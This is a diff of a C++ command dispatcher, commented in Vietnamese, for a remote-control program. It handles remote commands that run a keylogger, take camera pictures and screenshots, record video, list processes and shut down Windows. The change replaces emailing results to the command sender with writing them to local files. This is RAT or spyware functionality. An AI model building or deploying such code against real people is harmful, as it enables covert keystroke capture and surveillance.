@@ -1,6 +1,22 @@
 #include "executeCommand.h"
 
-thread_local string g_current_sender;  // người nhận hiện tại
+// Loại bỏ g_current_sender vì server không gửi email nữa
+
+int parse_keylogger_duration(const string& command) {
+  size_t pos = command.find("keylogger");
+  if (pos == string::npos) return 30;  // default 30 seconds
+
+  string remaining = command.substr(pos + 9);  // skip "keylogger"
+
+  // Tìm số trong chuỗi
+  regex numberRegex(R"(\d+)");
+  smatch match;
+  if (regex_search(remaining, match, numberRegex)) {
+    return stoi(match.str());
+  }
+
+  return 30;  // default
+}
 
 static string trim_command_internal(string command) {
   command.erase(command.begin(), find_if(command.begin(), command.end(),
@@ -24,19 +40,11 @@ void handle_start_program(const string& command) {
     if (reinterpret_cast<INT_PTR>(result) <= 32) {
       cerr << "Failed to start program. Error code: "
            << reinterpret_cast<INT_PTR>(result) << endl;
-      if (!g_current_sender.empty()) {
-        send_email_with_attachment(g_current_sender, "start_program failed",
-                                   "Failed to start: " + prog, "");
-      }
     } else {
-      if (!g_current_sender.empty()) {
-        send_email_with_attachment(g_current_sender, "start_program succeeded",
-                                   "Started program: " + prog, "");
-      }
+      cout << "Program started successfully: " << prog << endl;
     }
-  } else if (!g_current_sender.empty()) {
-    send_email_with_attachment(g_current_sender, "start_program",
-                               "No program specified.", "");
+  } else {
+    cout << "No program specified for start_program command" << endl;
   }
 }
 
@@ -47,154 +55,126 @@ void handle_shutdown_program(const string& command) {
 
   if (!proc.empty()) {
     shutdown_program(proc);
-    if (!g_current_sender.empty()) {
-      send_email_with_attachment(g_current_sender, "shutdown_program",
-                                 "Shutdown program: " + proc, "");
-    }
-  } else if (!g_current_sender.empty()) {
-    send_email_with_attachment(g_current_sender, "shutdown_program",
-                               "No process specified.", "");
+    cout << "Shutdown program command executed for: " << proc << endl;
+  } else {
+    cout << "No process specified for shutdown_program command" << endl;
   }
 }
 
-void handle_get_picture() {
-  send_picture();  // tự gửi hình trong đó
-                   // send_picture() hiện gửi luôn mail; không cần gửi thêm
+void handle_get_picture(const string& outFile) { take_picture(outFile); }
+
+void handle_get_screenshot(const string& outFile) { take_screenshot(outFile); }
+
+void handle_list_programs(const string& outFile) {
+  list_programs_to_file(outFile);  // Running programs
 }
 
-void handle_get_screenshot() {
-  send_screenshot();  // tự gửi mail
+void handle_list_processes(const string& outFile) {
+  list_processes_to_file(outFile);  // Processes with PID
 }
 
-void handle_list_programs() {
-  list_programs();  // tự gửi mail với danh sách programs
+void handle_list_installed(const string& outFile) {
+  list_installed_programs_to_file(outFile);  // Installed programs
 }
 
-void handle_list_processes() {
-  list_processes();  // tự gửi mail với danh sách processes
+void handle_start_recording(const string& outFile, int duration) {
+  run_recording_and_save(outFile, duration);
 }
 
-void handle_send_file(const string& command) {
-  string filepath = command.substr(9);  // After "send_file"
-  filepath.erase(filepath.begin(),
-                 find_if(filepath.begin(), filepath.end(),
-                         [](int ch) { return !isspace(ch); }));
-
-  if (!filepath.empty()) {
-    cout << "Sending file: " << filepath << endl;
-
-    // Kiểm tra file có tồn tại không
-    ifstream file_check(filepath);
-    if (!file_check.good()) {
-      cerr << "File not found: " << filepath << endl;
-      if (!g_current_sender.empty()) {
-        send_email_with_attachment(g_current_sender, "send_file failed",
-                                   "File not found: " + filepath, "");
-      }
-      return;
-    }
-    file_check.close();
-
-    // Gửi file qua email
-    if (!g_current_sender.empty()) {
-      send_email_with_attachment(g_current_sender, "File from remote computer",
-                                 "Requested file: " + filepath, filepath);
-    }
-  } else if (!g_current_sender.empty()) {
-    send_email_with_attachment(g_current_sender, "send_file",
-                               "No file path specified.", "");
-  }
-}
-
-void handle_start_recording() {
-  cout << "Starting video recording..." << endl;
-  start_recording();
-  if (!g_current_sender.empty()) {
-    send_email_with_attachment(g_current_sender, "start_recording",
-                               "Video recording started", "");
-  }
-}
-
-void handle_stop_recording() {
-  cout << "Stopping video recording and sending..." << endl;
-  stop_and_send_recording();
-  if (!g_current_sender.empty()) {
-    send_email_with_attachment(g_current_sender, "stop_recording",
-                               "Video recording stopped and sent", "");
-  }
-}
-
-void handle_shutdown() {
-  cout << "Initiating system shutdown..." << endl;
-  if (system("shutdown /s /t 0") != 0) {
-    cerr << "Shutdown command failed" << endl;
-    if (!g_current_sender.empty()) {
-      send_email_with_attachment(g_current_sender, "shutdown",
-                                 "Shutdown command failed", "");
-    }
-  } else if (!g_current_sender.empty()) {
-    send_email_with_attachment(g_current_sender, "shutdown",
-                               "Shutdown initiated", "");
-  }
-}
-
-void handle_keylogger(const string& command) {
+void handle_keylogger(const string& command, const string& outFile) {
   istringstream iss(command);
   string cmd;
   int duration = 10;
   iss >> cmd >> duration;
 
   cout << "Starting keylogger for " << duration << " seconds..." << endl;
-  start_keylogger("keylog.txt", duration);
-  if (!g_current_sender.empty()) {
-    send_email_with_attachment(g_current_sender, "Keylogger output",
-                               "Attached keylog", "keylog.txt");
+  start_keylogger(outFile, duration);
+}
+
+void handle_shutdown() {
+  cout << "Initiating system shutdown..." << endl;
+  if (system("shutdown /s /t 0") != 0) {
+    cerr << "Shutdown command failed" << endl;
+  } else {
+    cout << "Shutdown initiated successfully" << endl;
   }
 }
 
 void execute_command(const string& command) {
-  cout << "[Command]: " << command << endl;
+  cout << "[Execute] Processing command: " << command << endl;
 
-  string trimmed_cmd = trim_command_internal(command);
-  if (trimmed_cmd.empty()) {
-    cout << "Empty command received" << endl;
-    return;
-  }
+  if (command.find("start_program") == 0) {
+    string program = command.substr(13);  // skip "start_program"
+    program.erase(0, program.find_first_not_of(" "));
 
-  if (trimmed_cmd.find("start_program") == 0) {
-    handle_start_program(trimmed_cmd);
-  } else if (trimmed_cmd.find("shutdown_program") == 0) {
-    handle_shutdown_program(trimmed_cmd);
-  } else if (trimmed_cmd.find("get_picture") == 0) {
-    handle_get_picture();
-  } else if (trimmed_cmd.find("get_screenshot") == 0) {
-    handle_get_screenshot();
-  } else if (trimmed_cmd.find("list_program") == 0) {
-    handle_list_programs();
-  } else if (trimmed_cmd.find("list_process") == 0) {
-    handle_list_processes();
-  } else if (trimmed_cmd.find("send_file") == 0) {
-    handle_send_file(trimmed_cmd);
-  } else if (trimmed_cmd.find("start_recording") == 0) {
-    handle_start_recording();
-  } else if (trimmed_cmd.find("stop_recording") == 0) {
-    handle_stop_recording();
-  } else if (trimmed_cmd.find("shutdown") == 0) {
-    handle_shutdown();
-  } else if (trimmed_cmd.find("keylogger") == 0) {
-    handle_keylogger(trimmed_cmd);
-  } else {
-    cout << "Unknown command: " << trimmed_cmd << endl;
-    if (!g_current_sender.empty()) {
-      send_email_with_attachment(g_current_sender, "Unknown command",
-                                 "Received unknown command: " + trimmed_cmd,
-                                 "");
+    if (!program.empty()) {
+      cout << "[Execute] Starting program: " << program << endl;
+      system(("start \"\" \"" + program + "\"").c_str());
     }
+  } else if (command == "shutdown") {
+    cout << "[Execute] Shutting down system..." << endl;
+    system("shutdown /s /t 5 /c \"Remote shutdown initiated\"");
+  } else if (command == "restart") {
+    cout << "[Execute] Restarting system..." << endl;
+    system("shutdown /r /t 5 /c \"Remote restart initiated\"");
+  } else if (command == "cancel_shutdown") {
+    cout << "[Execute] Cancelling shutdown/restart..." << endl;
+    system("shutdown /a");
+  } else if (command.find("keylogger") == 0) {
+    int duration = parse_keylogger_duration(command);
+    cout << "[Execute] Starting keylogger for " << duration << " seconds..."
+         << endl;
+    start_keylogger("C:/MMT/keylog.txt", duration);
+  } else {
+    cout << "[Execute] Unknown command: " << command << endl;
   }
 }
 
-void execute_command_with_sender(const string& sender, const string& command) {
-  g_current_sender = sender;
-  execute_command(command);
-  g_current_sender.clear();
+void execute_command_with_file(const string& command,
+                               const string& outputFile) {
+  cout << "[Execute] Processing command with file output: " << command << endl;
+
+  if (command == "get_screenshot") {
+    // Placeholder for screenshot - create empty file with message
+    ofstream screenshotFile(outputFile);
+    if (screenshotFile.is_open()) {
+      screenshotFile << "Screenshot feature not implemented yet." << endl;
+      screenshotFile.close();
+    }
+  } else if (command == "get_picture") {
+    // Placeholder for camera picture - create empty file with message
+    ofstream pictureFile(outputFile);
+    if (pictureFile.is_open()) {
+      pictureFile << "Camera picture feature not implemented yet." << endl;
+      pictureFile.close();
+    }
+  } else if (command == "list_program") {
+    list_programs_to_file(outputFile);
+  } else if (command == "list_process") {
+    list_processes_to_file(outputFile);
+  } else if (command == "list_installed") {
+    list_installed_programs_to_file(outputFile);
+  } else if (command == "get_recording") {
+    int duration = 10;  // default 10 seconds
+    // Parse duration from command if provided
+    regex numberRegex(R"(\d+)");
+    smatch match;
+    if (regex_search(command, match, numberRegex)) {
+      duration = stoi(match.str());
+    }
+    run_recording_and_save(outputFile, duration);
+  } else if (command.find("keylogger") == 0) {
+    int duration = parse_keylogger_duration(command);
+    cout << "[Execute] Starting keylogger with file output for " << duration
+         << " seconds..." << endl;
+    start_keylogger(outputFile, duration);
+  } else {
+    cout << "[Execute] Unknown command with file: " << command << endl;
+    // Tạo file error
+    ofstream errorFile(outputFile);
+    if (errorFile.is_open()) {
+      errorFile << "Error: Unknown command - " << command << endl;
+      errorFile.close();
+    }
+  }
 }
